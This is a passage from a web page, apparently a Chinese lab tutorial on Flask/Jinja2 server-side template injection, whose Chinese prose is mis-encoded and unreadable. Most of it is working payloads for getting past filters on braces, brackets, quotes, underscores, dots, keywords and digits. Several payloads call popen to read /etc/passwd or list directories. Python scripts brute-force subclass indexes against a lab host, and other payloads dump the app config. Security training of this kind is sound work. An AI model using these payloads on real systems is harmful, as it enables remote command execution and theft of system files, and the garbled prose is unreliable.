class="headerlink" title="å¸¸è§ç»•è¿‡æ–¹å¼"></a>å¸¸è§ç»•è¿‡æ–¹å¼</h1><h2 id="ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·"><a href="#ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·" class="headerlink" title="ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·"></a>ç»•è¿‡è¿‡æ»¤åŒå¤§æ‹¬å·</h2><p><strong>ä½¿ç”¨ä»‹ç»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% %&#125;æ˜¯å±äºflaskçš„æ§åˆ¶è¯­å¥ï¼Œä¸”ä»¥&#123;% end... %&#125;ç»“å°¾ï¼Œå¯ä»¥é€šè¿‡åœ¨æ§åˆ¶è¯­å¥å®šä¹‰å˜é‡æˆ–è€…å†™å¾ªç¯åˆ¤æ–­</span><br></pre></td></tr></table></figure><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        &#123;% for i in range(500) %&#125;</span><br><span class="line">        &#123;% if i &gt; 200 %&#125;</span><br><span class="line">        &#123;&#123;i&#125;&#125;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">        &#123;&#123;i-1&#125;&#125;</span><br><span class="line">        &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜æ€è·¯</strong></p><p>åˆ¤æ–­<code>&#123;&#123;&#125;&#125;</code>è¢«è¿‡æ»¤ï¼Œå°è¯•<code>&#123;% %&#125;</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 2&gt;1 %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">åˆ¤æ–­è¯­å¥èƒ½å¦æ­£å¸¸æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">&#123;% if &#x27;&#x27;.__class__ %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">æœ‰å›æ˜¾Spongebobè¯´æ˜&#x27;&#x27;.__class__æœ‰å†…å®¹</span><br><span class="line"></span><br><span class="line">&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;+str(i)+&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;Spongebob&#123;%endif%&#125;</span><br><span class="line">å¦‚æœæœ‰å›æ˜¾Spongebobåˆ™è¯´æ˜å‘½ä»¤æ­£å¸¸æ‰§è¡Œ</span><br><span class="line"></span><br><span class="line">&#123;%print(&quot;&quot;.__class__.__base__.__subclasses__()[117].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read())%&#125;</span><br><span class="line">ä½¿ç”¨print()æ‰§è¡Œä»£ç </span><br></pre></td></tr></table></figure><p>æ„é€ è„šæœ¬æŸ¥è¯¢å¯ä½¿ç”¨â€popenâ€çš„å­ç±»ç¼–å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://192.168.17.129:18080/flasklab/level/2&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;% if &quot;&quot;.__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__[&quot;popen&quot;](&quot;cat /etc/passwd&quot;).read() %&#125;Spongebob&#123;%endif%&#125;&#x27;</span>&#125;</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Spongebob&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡è¿‡æ»¤ä¸­æ‹¬å·"><a href="#ç»•è¿‡è¿‡æ»¤ä¸­æ‹¬å·" class="headerlink" title="ç»•è¿‡è¿‡æ»¤ä¸­æ‹¬å·"></a>ç»•è¿‡è¿‡æ»¤ä¸­æ‹¬å·</h2><h3 id="getitem-é­”æœ¯æ–¹æ³•"><a href="#getitem-é­”æœ¯æ–¹æ³•" class="headerlink" title="_getitem_()é­”æœ¯æ–¹æ³•"></a>_<em>getitem_</em>()é­”æœ¯æ–¹æ³•</h3><p><code>__getitem__()</code>æ˜¯pythonçš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•</p><ul><li>å¯¹å­—å…¸ä½¿ç”¨æ—¶ï¼Œä¼ å…¥<strong>å­—ç¬¦ä¸²</strong>è¿”å›å­—å…¸ç›¸åº”é”®æ‰€å¯¹åº”çš„å€¼</li><li>å¯¹åˆ—è¡¨ä½¿ç”¨æ—¶ï¼Œä¼ å…¥<strong>æ•´æ•°</strong>è¿”å›åˆ—è¡¨å¯¹åº”ç´¢å¼•çš„å€¼</li></ul><p><strong>demo</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.a = &#123;</span><br><span class="line">            <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;æµ·ç»µå®å®&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;æ´¾å¤§æ˜Ÿ&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;ç« é±¼å“¥&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key</span>):</span><br><span class="line">        b = self.a[key]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">t = test()</span><br><span class="line"><span class="built_in">print</span>(t[<span class="string">&#x27;1&#x27;</span>])</span><br></pre></td></tr></table></figure><h3 id="WAFè¿‡æ»¤-ä¾‹é¢˜"><a href="#WAFè¿‡æ»¤-ä¾‹é¢˜" class="headerlink" title="WAFè¿‡æ»¤[]ä¾‹é¢˜"></a>WAFè¿‡æ»¤[]ä¾‹é¢˜</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;# å…ˆæ£€æµ‹åŒå¤§æ‹¬å·æ˜¯å¦è¿‡æ»¤</span><br><span class="line">&#123;&#123;&#x27;&#x27;&#125;&#125;æˆ–&#123;&#123;&quot;&quot;&#125;&#125;ç­‰# æ£€æµ‹æ˜¯å¦è¿‡æ»¤ç¬¦å·</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;# æ£€æµ‹æ˜¯å¦æœ‰ä¸‹åˆ’çº¿è¿‡æ»¤æˆ–è€…ç‰¹æ®Šå­—ç¬¦</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[]&#125;&#125;# åˆ°æ­¤æ­¥éª¤åå‘ç°æœ‰wafå­—æ · </span><br><span class="line">ä½¿ç”¨__getitem__()å¯è·å–åˆ—è¡¨æŸä¸€ä¸ªå€¼ï¼Œå¯æ›¿ä»£[]</span><br></pre></td></tr></table></figure><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja2_13.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_14.png" alt=""></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/jinja_15.png" alt=""></p><p>pythonè„šæœ¬ï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/4&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__().__getitem__(&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,response.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨<code>__getitem__()</code>æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤"><a href="#ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤"></a>ç»•è¿‡å•åŒå¼•å·è¿‡æ»¤</h2><p><strong>request</strong></p><ul><li>requeståœ¨flaskä¸­å¯ä»¥è®¿é—®åŸºäºHTTPè¯·æ±‚ä¼ é€’çš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ­¤requestå¹¶épythonçš„å‡½æ•°ï¼Œè€Œæ˜¯åœ¨flaskå†…éƒ¨çš„å‡½æ•°</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># è·å–getä¼ å…¥çš„keyçš„å€¼</span></span><br><span class="line">request.values.x1<span class="comment"># æ‰€æœ‰å‚æ•°</span></span><br><span class="line">request.cookies<span class="comment"># è·å–cookiesä¼ å…¥å‚æ•°</span></span><br><span class="line">request.headers<span class="comment"># è·å–è¯·æ±‚å¤´è¯·æ±‚å‚æ•°</span></span><br><span class="line">requests.form.key<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: application/x-www-form-urlencodedæˆ–multipart/form-dataï¼‰</span></span><br><span class="line">request.data<span class="comment"># è·å–postä¼ å…¥å‚æ•°ï¼ˆContent-Type: a/bï¼‰</span></span><br><span class="line">request.json<span class="comment"># è·å–postä¼ å…¥jsonå‚æ•°ï¼ˆContent-Type: application/jsonï¼‰</span></span><br></pre></td></tr></table></figure><p>åœ¨æ„é€ payloadæ—¶å¤§å¤šä¼šç”¨åˆ°å•åŒå¼•å·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥é€šè¿‡æ„é€ å¸¦å‚æ•°çš„urlï¼Œé…åˆrequestè·å–å‚æ•°çš„å†…å®¹æ¥ç»„æˆæƒ³è¦æäº¤çš„æŒ‡ä»¤ï¼Œä»è€Œç»•è¿‡å•åŒå¼•å·çš„ä½¿ç”¨</p><p>requestæ¨¡å—æ‰€åœ¨ä½ç½®<code>os._wrap_close</code>å†…å¯ä»¥æ‰§è¡Œï¼Œå› æ­¤æŸ¥æ‰¾è¯¥æ¨¡å—æ‰€åœ¨ä½ç½®ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://192.168.17.129:18080/flasklab/level/5&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#125;&#125;&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;_wrap_close&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i,<span class="string">&quot;---&gt;&quot;</span>,response.text)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>GETæäº¤æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">URL?a=popen&amp;b=cat /etc/passwd</span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.args.a)(request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>POSTæäº¤æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.form.k1)(request.form.k2).read()&#125;&#125;&amp;k1=popen&amp;k2=cat /etc/passwd</span><br></pre></td></tr></table></figure><p>cookieæäº¤æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">code=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(request.cookies.k1)(request.cookies.k2).read()&#125;&#125;</span><br><span class="line">Cookie: k1=popen;k2=cat /etc/passwd</span><br></pre></td></tr></table></figure><h2 id="è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿"><a href="#è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿"></a>è¿‡æ»¤å™¨ç»•è¿‡ä¸‹åˆ’çº¿</h2><p><strong>è¿‡æ»¤å™¨</strong></p><ul><li>è¿‡æ»¤å™¨é€šè¿‡ç®¡é“ç¬¦å·<code>|</code>ä¸å˜é‡è¿æ¥ï¼Œå¹¶ä¸”åœ¨æ‹¬å·ä¸­å¯èƒ½æœ‰å¯é€‰çš„å‚æ•°</li></ul><p>flaskå¸¸ç”¨è¿‡æ»¤å™¨</p><blockquote><p><code>length()</code> è·å–ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦å¹¶å°†å…¶è¿”å›</p><p><code>int()</code> å°†å€¼è½¬æ¢ä¸ºintç±»å‹</p><p><code>float()</code> å°†å€¼è½¬æ¢ä¸ºfloatç±»å‹</p><p><code>lower()</code> å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™</p><p><code>upper()</code> å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™</p><p><code>reverse()</code> åè½¬å­—ç¬¦ä¸²</p><p><code>replace(value,old,new)</code> å°†valueä¸­çš„oldæ›¿æ¢ä¸ºnew</p><p><code>list()</code> å°†å˜é‡è½¬æ¢ä¸ºåˆ—è¡¨ç±»å‹</p><p><code>string()</code> å°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ç±»å‹</p><p><code>join()</code> å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ï¼Œé€šå¸¸ç”±pytohnå†…ç½®çš„dict()é…åˆä½¿ç”¨</p><p><code>attr()</code> è·å–å¯¹è±¡çš„å±æ€§</p></blockquote><p><strong>attrç»•è¿‡ä¸‹åˆ’çº¿è¿‡æ»¤</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__().__getitem__(117).__init__.__globals__.__getitem__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">1. ä½¿ç”¨requestæ–¹æ³•</span><br><span class="line">GETæäº¤ï¼š?cla=__class__</span><br><span class="line">POSTæäº¤ï¼šcode=&#123;&#123;()|attr(request.args.cla)&#125;&#125;</span><br><span class="line"></span><br><span class="line">2. ä½¿ç”¨unicodeç¼–ç </span><br><span class="line">3. ä½¿ç”¨16ä½ç¼–ç </span><br><span class="line">4. base64ç¼–ç </span><br><span class="line">5. æ ¼å¼åŒ–å­—ç¬¦ä¸²</span><br></pre></td></tr></table></figure><h2 id="ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤"><a href="#ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤" class="headerlink" title="ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤"></a>ä¸­æ‹¬å·ç»•è¿‡ç‚¹è¿‡æ»¤</h2><p>ç‚¹<code>.</code>è¢«è¿‡æ»¤</p><ul><li>ç”¨ä¸­æ‹¬å·<code>[]</code>ä»£æ›¿ç‚¹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[117][&#x27;__init__&#x27;][&#x27;__globals__&#x27;][&#x27;popen&#x27;](&#x27;cat /etc/passwd&#x27;)[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>ç”¨<code>attr()</code>ç»•è¿‡</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[117].__init__.__globals__(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;()|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)()|attr(&#x27;__getitem__&#x27;)(199)|attr(&#x27;__init__&#x27;)|attr(&#x27;__globals__&#x27;)|attr(&#x27;__getitem__&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat /etc/passwd&#x27;)|attr(&#x27;read&#x27;)()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"><a href="#ç»•è¿‡å…³é”®å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å…³é”®å­—è¿‡æ»¤"></a>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</h2><p><strong>å…³é”®å­—ç»•è¿‡</strong></p><ul><li>è¿‡æ»¤äº†<code>class,arg,from,value,int,global</code>ç­‰å…³é”®å­—</li></ul><p>ä»¥<code>__class__</code>ä¸ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. å­—ç¬¦ç¼–ç </span><br><span class="line">2. æœ€ç®€å•æ‹¼æ¥&quot;+&quot;ï¼š&#x27;__cl&#x27;+&#x27;ass__&#x27;</span><br><span class="line">3. ä½¿ç”¨jinja2çš„~è¿›è¡Œæ‹¼æ¥ï¼š&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss_&quot;%&#125;&#123;&#123;()a~b&#125;&#125;</span><br><span class="line">4. ä½¿ç”¨è¿‡æ»¤å™¨(reverseåè½¬ã€replaceæ›¿æ¢ã€joinæ‹¼æ¥ç­‰)ï¼š&#123;%set a=&quot;__ssacl__&quot;|reverse%&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">5. åˆ©ç”¨pythonçš„char()ï¼š&#123;%set chr=url_for.globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Lengthè¿‡æ»¤å™¨ç»•è¿‡æ•°å­—è¿‡æ»¤"><a href="#Lengthè¿‡æ»¤å™¨ç»•è¿‡æ•°å­—è¿‡æ»¤" class="headerlink" title="Lengthè¿‡æ»¤å™¨ç»•è¿‡æ•°å­—è¿‡æ»¤"></a>Lengthè¿‡æ»¤å™¨ç»•è¿‡æ•°å­—è¿‡æ»¤</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 5</span><br><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length*&#x27;aaa&#x27;|length%&#125;&#123;&#123;a&#125;&#125;# 15</span><br><span class="line">&#123;% set a=&#x27;aaaaa&#x27;|length*&#x27;aaa&#x27;|length-&#x27;aaa&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 12</span><br></pre></td></tr></table></figure><p>æ„é€ payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[199].__init__.__globals__[&#x27;os&#x27;](&#x27;popen&#x27;)(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length-&#x27;a&#x27;|length %&#125;&#123;&#123;a&#125;&#125;# 199</span><br><span class="line"></span><br><span class="line">&#123;% set a=&#x27;aaaaaaaaaa&#x27;|length*&#x27;aaaaaaaaaa&#x27;|length*&#x27;aa&#x27;|length-&#x27;a&#x27;|length %&#125;&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[a].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="è·å–configæ–‡ä»¶"><a href="#è·å–configæ–‡ä»¶" class="headerlink" title="è·å–configæ–‡ä»¶"></a>è·å–configæ–‡ä»¶</h2><p>é€šè¿‡<code>&#123;&#123;config&#125;&#125;</code>æŸ¥çœ‹ï¼ˆæ— è¿‡æ»¤ï¼‰</p><p><strong>flaskå†…ç½®å‡½æ•°å’Œå¯¹è±¡</strong></p><ul><li>flaskå†…ç½®å‡½æ•°</li></ul><blockquote><p><code>lipsum</code> å¯åŠ è½½ç¬¬ä¸‰æ–¹åº“</p><p><code>url_for</code> å¯è¿”å›urlè·¯å¾„</p><p><code>get_flashed_message</code> å¯è·å–ä¿¡æ¯</p></blockquote><ul><li>flaskå†…ç½®å¯¹è±¡</li></ul><blockquote><p><code>cycler</code> </p><p><code>joiner</code> </p><p><code>namespace</code> </p><p><code>config</code> </p><p><code>request</code> </p><p><code>session</code> </p></blockquote><p>å¯åˆ©ç”¨å·²åŠ è½½å†…ç½®å‡½æ•°æˆ–å¯¹è±¡å¯»æ‰¾è¢«è¿‡æ»¤å­—ç¬¦ä¸²</p><p>å¯åˆ©ç”¨å†…ç½®å‡½æ•°è°ƒç”¨current_appæ¨¡å—ï¼Œè¿›è€ŒæŸ¥çœ‹é…ç½®æ–‡ä»¶</p><p><strong>current_app</strong></p><p><img src="/img/SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/current.png" alt=""></p><p><strong>è°ƒç”¨current_appç›¸å½“äºè°ƒç”¨flask</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="æ··åˆè¿‡æ»¤ç»•è¿‡"><a href="#æ··åˆè¿‡æ»¤ç»•è¿‡" class="headerlink" title="æ··åˆè¿‡æ»¤ç»•è¿‡"></a>æ··åˆè¿‡æ»¤ç»•è¿‡</h2><p><strong>dict()å’Œjoin</strong></p><blockquote><p><code>dict()</code> ç”¨æ¥åˆ›å»ºä¸€ä¸ªå­—å…¸</p><p><code>join</code> å°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²</p></blockquote><p><strong>egï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 